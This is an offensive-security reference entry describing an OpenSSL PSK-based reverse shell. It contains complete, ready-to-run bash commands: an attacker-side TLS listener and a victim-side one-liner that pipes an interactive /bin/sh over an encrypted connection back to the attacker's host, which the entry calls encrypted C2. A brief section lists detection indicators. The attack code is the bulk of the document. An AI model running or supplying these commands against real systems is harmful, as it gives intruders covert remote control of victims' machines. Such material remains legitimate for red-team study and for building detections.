---
type: code
language: bash
verified: true
platforms:
  - Linux
tags:
  - openssl
  - reverse-shell
  - psk
validated: true
---

# openssl-psk-based-reverse-shell

## Code

```bash
# generate 384-bit PSK
# use the generated string as a value for the two PSK variables from below
openssl rand -hex 48 
# server (attacker)
export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
# client (victim)
export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
```

## Description

This bash snippet implements a PSK-based OpenSSL reverse shell without certificates: generates a 384-bit PSK, starts a TLS-PSK server on the attacker with secure ciphers, and runs the victim client to connect back with a randomized piped shell for encrypted C2.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 4242 | Port for LPORT and RPORT | 4242 |
| 10.0.0.1 | Attacker IP (RHOST) | 10.0.0.1 |
| replacewithgeneratedpskfromabove | 96-char hex PSK | a1b2c3d4... (from openssl rand) |
| /tmp/... | Randomized pipe path | /tmp/abc123 |

## Usage

Generate PSK first, substitute into PSK vars, run server on attacker, then client on victim. Provides certificate-free encrypted reverse access; share PSK securely beforehand. Useful for air-gapped or cert-restricted environments.

## Detection

- Logs of openssl s_server with -psk/-nocert or s_client -psk flags.
- TLS-PSK handshakes without certs on non-443 ports via DPI.
- Suspicious mkfifo with random names and sh piping.
- EDR alerts on openssl rand -hex 48 or PSK cipher usage in traffic.

## Related

- [[procedures/openssl-reverse-shell]]
- [[tools/openssl]]
